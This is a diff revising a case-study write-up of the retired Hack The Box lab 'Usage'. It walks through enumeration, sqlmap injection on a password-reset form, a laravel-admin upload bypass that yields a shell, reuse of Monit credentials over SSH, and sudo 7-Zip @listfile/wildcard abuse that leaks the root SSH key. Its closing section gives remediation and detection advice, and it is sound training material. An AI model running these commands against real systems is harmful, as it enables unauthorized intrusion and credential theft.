@@ -1,5 +1,5 @@
 ---
-title: "Usage: SQL Injection, Upload Validation Bypass, and 7-Zip Wildcard Abuse"
+title: "Usage — SQL Injection to Root via Laravel-admin Upload Bypass and 7-Zip Wildcard Abuse"
 description: "SQL injection in a password-reset workflow and a Laravel-admin upload-validation bypass provide a foothold; reused Monit credentials enable SSH, and wildcard and @listfile handling in a sudo 7-Zip backup reach a protected root key."
 type: case-study
 platform: Hack The Box
@@ -13,93 +13,141 @@ tags:
   - credential-reuse
   - privilege-escalation
   - 7zip
+objective: "Escalate from an unauthenticated password-reset SQL injection to root through an authenticated upload-validation bypass, reused service credentials, and privileged archive handling."
+tools:
+  - nmap
+  - feroxbuster
+  - gobuster
+  - sqlmap
+  - hashcat
+  - netcat
+  - mime-file-forge
+skill: "Linux web exploitation and privilege escalation through SQL injection, upload-validation bypass, and wildcard-driven archive abuse"
+outcome: "Root access via a disclosed root SSH private key obtained through privileged 7-Zip @listfile and wildcard handling"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Easy |
+| Target environment | Ubuntu Linux; nginx 1.18.0 fronting a Laravel 10 application |
+| Starting position | Unauthenticated network access |
+| Objective | Escalate from an unauthenticated password-reset SQL injection to root through an authenticated upload-validation bypass, reused service credentials, and privileged archive handling |
+| Outcome | Root access via a disclosed root SSH private key obtained through privileged 7-Zip `@listfile` and wildcard handling |
 
 ## Summary
 
-Usage is a retired Hack The Box Linux lab. The notes report an attack chain from web enumeration through SQL injection in a password-reset workflow, an authenticated upload-validation bypass, service-credential reuse, and privileged backup abuse. Target-specific values, credentials, hashes, private keys, flags, and operator details are replaced with placeholders.
+Usage is an Easy-rated, retired Hack The Box Linux lab running an nginx-hosted Laravel application. A password-reset workflow is vulnerable to SQL injection, which exposes the `usage_blog` database and the Laravel-admin account hash; the recovered password unlocks an administrative virtual host whose file-upload validation is bypassed to execute a payload as a local user. Local enumeration then recovers Monit service credentials that are reused for SSH access to a second local account, and a passwordless sudo backup binary that invokes `7za` with a wildcard expands an `@` list file into disclosure of the root SSH private key. Target addresses, hostnames, credentials, hashes, and key material are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **Password-reset SQL injection → administrative credential recovery → authenticated upload-validation bypass (CVE-2023-24249) → code execution as a local user → Monit credential reuse over SSH → passwordless sudo 7-Zip backup → `@listfile` and wildcard abuse → root SSH key disclosure → root**
 
 ## Context and Objective
 
-- **Environment:** Linux target hosting an nginx-backed Laravel application.
-- **Starting position:** unauthenticated access to exposed SSH and HTTP services.
-- **Objective:** identify the web attack surface, obtain a foothold, and assess local privilege-escalation paths.
-- **Scope:** Hack The Box lab activity only.
+- **Target:** an Ubuntu Linux host exposing SSH (OpenSSH 8.9p1) and HTTP (nginx 1.18.0) fronting a Laravel 10.18.0 application.
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** identify the web attack surface, obtain a foothold, and assess local privilege-escalation paths to administrative control.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
 ### 1. Service and Virtual-Host Enumeration
 
-**Observation:** A TCP scan identified SSH and HTTP. Recorded HTTP output indicated a redirect to a virtual host.
+Observation: a full TCP scan exposes SSH and HTTP, and the web service redirects to a virtual host.
 
-**Action:** The notes used version and default-script scanning, then enumerated web paths and virtual hosts.
+Action: scan the target, then enumerate web paths and virtual hosts.
 
 ```bash
 nmap <TARGET_IP> -p- -Pn -sC -sV -oN <SCAN_OUTPUT>
-feroxbuster --url http://<TARGET_HOST> --wordlist <WORDLIST>
-gobuster vhost --url http://<TARGET_HOST> --wordlist <WORDLIST> --append-domain
+feroxbuster --url http://<TARGET_HOST> --wordlist <WEB_CONTENT_WORDLIST>
+gobuster vhost --url http://<TARGET_HOST> --wordlist <DNS_WORDLIST> --append-domain
 ```
+
+Truncated scan output:
 
 ```text
-22/tcp open  ssh
-80/tcp open  http
-<PASSWORD_RESET_ROUTE>
-<ADMIN_VHOST>
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://<TARGET_HOST>/
 ```
 
-**Technical significance:** Virtual-host routing can expose application components unavailable through the default HTTP host.
+Discovery results:
 
-**Result:** The notes report discovery of a password-reset route and a separate administrative virtual host.
+```text
+feroxbuster => http://<TARGET_HOST>/forget-password
+gobuster vhost => admin.<TARGET_HOST>
+```
+
+Significance: virtual-host routing exposes application components that the default host does not serve, and the scan separates a password-reset endpoint from a separate administrative interface.
+
+Result: a password-reset endpoint and an administrative virtual host are identified.
 
 ### 2. Password-Reset SQL Injection and Credential Recovery
 
-**Observation:** The password-reset request's email parameter accepted SQL injection testing. The initial threaded table dump contained a malformed bcrypt value.
+Observation: the `email` parameter in the password-reset request is injectable, and a threaded dump corrupts part of the stored bcrypt value.
 
-**Action:** The notes enumerated the backend database, identified the administrative-user table, then used a direct query with length and hexadecimal output to validate the recovered hash before offline cracking.
+Action: confirm the backend database, enumerate databases and tables, dump the administrative-user row, then re-query that row directly with length and hexadecimal output to obtain the full hash before offline cracking.
 
 ```bash
 sqlmap -r <REQUEST_FILE> -p email --batch --level 3 --dbs --threads 10
+sqlmap -r <REQUEST_FILE> -p email --batch --level 3 -D usage_blog --tables --threads 10
 sqlmap -r <REQUEST_FILE> -p email --batch --level 3 --threads 10 \
-  --sql-query="SELECT id,username,password,LENGTH(password),HEX(password) FROM <DATABASE>.<ADMIN_TABLE> WHERE username='<ADMIN_USER>'"
+  --sql-query="SELECT id,username,password,LENGTH(password),HEX(password) FROM usage_blog.admin_users WHERE username='admin'"
 hashcat <HASH_FILE> <WORDLIST> -D 2 -m 3200
 ```
+
+Backend identification:
 
 ```text
 back-end DBMS: MySQL >= 8.0.0
 available databases [3]:
-[*] <APPLICATION_DATABASE>
-<ADMIN_USER>,<BCRYPT_HASH>,60,<HEX_ENCODED_HASH>
+[*] usage_blog
+...
 ```
 
-**Technical significance:** Direct validation of length and byte representation avoids relying on a corrupted extraction before password recovery.
+Validated row from the direct query:
 
-**Result:** The notes report recovery of an administrative password from the validated bcrypt hash.
+```text
+1,admin,<BCRYPT_HASH>,60,<HEX_ENCODED_HASH>
+```
+
+Significance: threaded blind dumps can corrupt sensitive values, so cross-checking the stored value's length and byte representation avoids spending cracking effort on a truncated hash.
+
+Result: the validated bcrypt hash cracks offline to the administrative account password, which authenticates to the administrative panel.
 
 ### 3. Authenticated Upload-Validation Bypass
 
-**Observation:** The administrative interface exposed a Laravel-admin upload function. The notes associate its validation behavior with a filename-extension bypass.
+Observation: the recovered credential authenticates to the Laravel-admin panel, which reports its runtime versions and exposes a file-upload function.
 
-**Action:** The notes created an image-formatted server-side payload, uploaded it, changed its filename extension during the request, and triggered the resulting uploaded file while a listener waited.
+```text
+Laravel version 10.18.0
+PHP version     8.1.2-1ubuntu2.14
+Server          nginx/1.18.0
+```
+
+Action: build a PHP payload disguised as a JPEG, upload it through the admin upload function while changing the filename extension in transit, and trigger the uploaded file with a listener running.
 
 ```bash
 python3 <FILE_FORGE_TOOL> forge --payload-file <SERVER_SIDE_PAYLOAD> --type jpg --output <IMAGE_FILE> --separator newline
 nc -nlvp <LISTENER_PORT>
 ```
 
+Shell received:
+
 ```text
 <LOW_PRIVILEGE_USER>@<TARGET_HOST>:/$ id
-uid=<UID>(<LOW_PRIVILEGE_USER>) gid=<GID>(<LOW_PRIVILEGE_USER>) groups=<GID>(<LOW_PRIVILEGE_USER>)
+uid=1000(<LOW_PRIVILEGE_USER>) gid=1000(<LOW_PRIVILEGE_USER>) groups=1000(<LOW_PRIVILEGE_USER>)
 ```
 
-**Technical significance:** Upload controls that rely on client-controlled names or superficial type checks can permit server-side code execution when uploads are web-accessible.
+Significance: upload handling that trusts a client-supplied filename or a superficial type check lets a web-accessible upload execute server-side code; this weakness is tracked as CVE-2023-24249 for laravel-admin.
 
-**Result:** The notes report code execution as a low-privilege local user after the upload bypass.
+Result: command execution as a low-privilege local user is obtained.
 
-### 4. Local Service Configuration and Account Access
+### 4. Monit Credentials and SSH Access to a Second Account
 
-**Observation:** The low-privilege user's home directory contained Monit configuration artifacts, including a readable configuration file. The file contained credentials for the local monitoring service.
+Observation: the low-privilege user's home directory holds Monit configuration, and the `.monitrc` file is readable by that user and contains the service's HTTP credentials.
 
-**Action:** The notes enumerated the home directory, reviewed the monitoring configuration, and tested the recovered password for SSH access to a different local account.
+Action: enumerate the home directory, read the Monit configuration, and test the recovered password for SSH access to a second local account.
 
 ```bash
 ls -la /home/<LOW_PRIVILEGE_USER>
@@ -107,81 +155,117 @@ cat ~/.monitrc
 ssh <SECOND_USER>@<TARGET_HOST>
 ```
 
-```text
-set httpd port <MONIT_PORT>
-allow <MONIT_USER>:<MONIT_PASSWORD>
+Truncated listing and configuration:
 
-<SECOND_USER>@<TARGET_HOST>:~$ id
-uid=<UID>(<SECOND_USER>) gid=<GID>(<SECOND_USER>) groups=<GID>(<SECOND_USER>)
+```text
+-rwx------ 1 <LOW_PRIVILEGE_USER> <LOW_PRIVILEGE_USER>  707 Oct 26  2023 .monitrc
+set httpd port 2812
+     allow <MONIT_USER>:<MONIT_PASSWORD>
 ```
 
-**Technical significance:** Credentials stored in user-readable service configuration can bridge local service access and operating-system account access when reused.
+Authenticated session:
 
-**Result:** The notes report that the monitoring-service password authenticated the second local user over SSH.
+```text
+<SECOND_USER>@<TARGET_HOST>:~$ id
+uid=1001(<SECOND_USER>) gid=1001(<SECOND_USER>) groups=1001(<SECOND_USER>)
+```
+
+Significance: a credential stored in a user-readable service configuration file moves access from a local service to an operating-system account when the same password is reused.
+
+Result: the Monit service password authenticates the second local account over SSH.
 
 ### 5. Privileged Backup Path Discovery
 
-**Observation:** The second user could run a custom management binary through sudo without a password. String inspection showed a project-backup operation invoking `7za` with a wildcard from a writable directory.
+Observation: the second user may run a custom management binary as root without a password, and its embedded strings show a project-backup step that calls `7za` with a wildcard.
 
-**Action:** The notes enumerated sudo rights and inspected the binary's embedded command strings.
+Action: enumerate the permitted sudo commands and inspect the binary's embedded strings.
 
 ```bash
 sudo -l
 strings /usr/bin/<MANAGEMENT_BINARY>
 ```
 
+Truncated output:
+
 ```text
 (ALL : ALL) NOPASSWD: /usr/bin/<MANAGEMENT_BINARY>
 /usr/bin/7za a <BACKUP_ARCHIVE> -tzip -snl -mmt -- *
 ```
 
-**Technical significance:** Wildcard expansion in a privileged archive operation can allow attacker-controlled filenames to alter archive input handling.
+Significance: wildcard expansion inside a privileged archive command lets filenames in a writable directory influence what the archive reads.
 
-**Result:** The notes report a sudo-allowed backup path using `7za` with wildcard-expanded input.
+Result: a passwordless sudo path runs a backup operation that expands a wildcard.
 
-### 6. 7-Zip List-File Abuse and Root Access
+### 6. 7-Zip List-File Abuse and Root Key Disclosure
 
-**Observation:** The writable backup directory and `7za` list-file behavior allowed an `@`-prefixed filename to reference a symlinked protected file during the privileged archive operation.
+Observation: because the backup runs from a writable directory and expands `*`, 7-Zip's `@` list-file handling can be pointed at a symlinked protected file.
 
-**Action:** The notes created an `@` list-file reference and a symlink to a protected SSH key, then selected the project-backup function in the management utility.
+Action: create an `@` list-file reference and a symlink to the root SSH key in the writable directory, then run the management binary and select the project-backup option.
 
 ```bash
 cd <WRITABLE_PROJECT_DIRECTORY>
 touch -- @<LIST_FILE>
-ln -s <PROTECTED_KEY_PATH> <SYMLINK_NAME>
+ln -s <PROTECTED_KEY_PATH> <LIST_FILE>
 sudo /usr/bin/<MANAGEMENT_BINARY>
 ```
+
+The privileged backup prints the referenced file:
 
 ```text
 Choose an option:
 1. Project Backup
-
-<PROTECTED_FILE_CONTENT>
+...
+-----BEGIN OPENSSH PRIVATE KEY-----
+<REDACTED_KEY_MATERIAL>
+-----END OPENSSH PRIVATE KEY-----
 ```
 
-**Technical significance:** `@listfile` processing can turn wildcard-driven archive input into arbitrary-file disclosure when a privileged process traverses attacker-controlled names.
+Action: save the disclosed key with restricted permissions and authenticate as root.
 
-**Result:** The notes report disclosure of a root SSH private key and subsequent root access; key material and flag content are omitted.
+```bash
+chmod 600 <ROOT_KEY_FILE>
+ssh root@<TARGET_HOST> -i <ROOT_KEY_FILE>
+```
+
+```text
+root@<TARGET_HOST>:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Significance: `@listfile` processing turns wildcard-driven archive input into arbitrary-file disclosure when a privileged process reads attacker-controlled names.
+
+Result: the root SSH private key is disclosed and used to obtain root.
 
 ## Challenges and Decisions
 
-- **Malformed threaded hash dump:** The notes report that a threaded extraction corrupted part of the bcrypt value. A direct query with `LENGTH()` and `HEX()` established a validated value before cracking.
-- **Upload validation:** The notes report that changing the uploaded filename extension in transit bypassed the observed validation behavior.
-- **Wildcard archive handling:** The notes report use of a symlink and an `@` list-file reference because the privileged backup operation expanded a wildcard in a writable directory.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| A threaded `sqlmap` dump corrupted part of the stored bcrypt value | Re-queried the row directly with `LENGTH()` and `HEX()` before cracking | A direct query yields the complete value and avoids cracking a truncated hash |
+| Upload validation accepted only image types | Changed the uploaded filename extension in transit | The check trusted the client-supplied filename |
+| The privileged backup expanded a wildcard in a writable directory | Created an `@` list file and a symlink to a protected file | `7za` reads `@`-prefixed arguments as list files, so the wildcard traversal exposed the symlink target |
 
 ## Outcome
 
-The notes report a complete chain: web enumeration, password-reset SQL injection, administrative access, upload-based code execution, monitoring-credential reuse, and root access through privileged 7-Zip wildcard abuse. Available notes provide command excerpts and local identity output for stages of the chain; sensitive values and flag content are intentionally omitted.
+Root access was obtained via a disclosed root SSH private key recovered through privileged 7-Zip `@listfile` and wildcard handling; the recovered credential, hash, and key values are omitted, so the secrets are not reproducible from this writeup.
 
 ## Lessons and Recommendations
 
-1. **Use parameterized database queries.** Recommendation: password-reset workflows should bind user input rather than constructing SQL queries from request values.
-2. **Validate extracted secrets before use.** The notes report that length and hexadecimal checks prevented cracking an incomplete bcrypt value.
-3. **Treat uploads as untrusted content.** Recommendation: validate content server-side and store uploads outside executable web paths.
-4. **Separate service and system credentials.** Recommendation: use unique credentials and restrict readability of service configuration files.
-5. **Avoid wildcard input in privileged archive jobs.** Recommendation: use explicit, controlled file lists and prevent attacker-controlled filenames from influencing privileged backup operations.
+Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. The actions are recommendations; none was validated in the lab.
+
+1. **SQL injection in the password-reset workflow.** The `email` parameter is used to build a database query, exposing the application database and the administrative credential. *Recommendation:* bind user input with parameterized queries instead of constructing SQL from request values. *Detection:* alert on SQL-metacharacter patterns and on enumeration-heavy queries from a single source.
+2. **Upload-validation bypass (CVE-2023-24249).** A web-accessible upload accepted a PHP payload renamed as an image, yielding code execution. *Recommendation:* validate uploads server-side, store them outside executable web paths, and track upstream releases for the management panel. *Detection:* alert on executable file types appearing under upload directories.
+3. **Service credential reuse.** A Monit password stored in a user-readable `.monitrc` authenticated a different local account over SSH. *Recommendation:* issue unique credentials per account and service, and restrict configuration-file readability. *Detection:* alert on successful logins where a service credential is used on an account it does not own.
+4. **Wildcard input in a privileged backup.** A root-run backup expanded a wildcard from a writable directory, turning `@listfile` handling into arbitrary-file disclosure. *Recommendation:* avoid wildcard expansion in privileged commands and pass explicit, controlled file lists. *Detection:* review sudo-allowed commands and monitor privileged backup invocations for attacker-controlled filenames.
 
 ## References
 
-- Hack The Box machine: [Usage](https://app.hackthebox.com/machines/Usage)
-- 7-Zip documentation for list-file handling
+- [Hack The Box — Usage](https://app.hackthebox.com/machines/Usage) (retired machine)
+- [NVD — CVE-2023-24249](https://nvd.nist.gov/vuln/detail/CVE-2023-24249) (laravel-admin arbitrary file upload, CWE-434)
+- [GitHub Advisory — GHSA-g857-47pm-3r32](https://github.com/advisories/GHSA-g857-47pm-3r32) (laravel-admin arbitrary file upload advisory)
+- [laravel-admin project (z-song/laravel-admin)](https://github.com/z-song/laravel-admin)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
+- [feroxbuster](https://github.com/epi052/feroxbuster)
+- [Gobuster](https://github.com/OJ/gobuster)
+- [sqlmap](https://sqlmap.org/)
+- [hashcat](https://hashcat.net/hashcat/)
+- [7-Zip](https://7-zip.org/)
